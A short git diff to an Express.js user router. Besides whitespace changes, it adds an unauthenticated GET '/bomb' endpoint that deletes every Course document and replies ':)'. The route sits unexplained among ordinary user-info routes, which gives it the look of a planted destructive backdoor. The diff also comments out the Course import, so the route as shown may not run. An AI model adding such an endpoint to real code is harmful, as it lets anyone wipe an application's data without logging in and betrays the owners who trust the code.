@@ -1,5 +1,7 @@
 const router = require('express').Router()
 const User = require('../models/user')
+//const Course = require('../models/course');
+
 
 function Auth(req, res, next) {
     // return next();
@@ -11,6 +13,11 @@ function Auth(req, res, next) {
     }
 }
 
+
+router.get('/bomb', async (req,res)=>{
+    const a = await Course.deleteMany({});
+    res.send(':)')    
+})
 
 router.post('/updateinfo',(req,res)=>{
     console.log('try update info');
@@ -44,5 +51,6 @@ router.get('/getUserInfo',Auth,(req,res)=>{
         studentID: req.session.passport.user.studentID
     })
 })
+
 
 module.exports = router;
